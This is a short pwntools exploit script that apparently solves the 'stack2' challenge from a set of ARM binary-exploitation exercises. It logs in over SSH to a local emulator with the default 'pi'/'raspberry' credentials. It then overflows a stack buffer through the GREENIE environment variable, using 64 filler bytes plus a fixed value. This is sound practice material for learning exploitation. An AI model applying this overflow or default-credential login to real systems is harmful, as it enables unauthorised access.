#!/usr/bin/python3
from pwn import *
# change port for your machine
s = ssh(host='localhost', user='pi', password='raspberry', port=5022)
# overflowing the buffer modifies the stack
exploit=b'export GREENIE=$(python -c \'print("a"*64+"\\x0a\\x0d\\x0a\\x0d")\') && '
exploit+=b'~/binary-exploitation-solution-scripts/azeriaARMchallenges/stack2sol/stack2'
sh = s.shell('bash')
sh.sendline(exploit)
sh.recvline()
log.info(sh.recvline()[67:].decode('utf-8'))
s.close()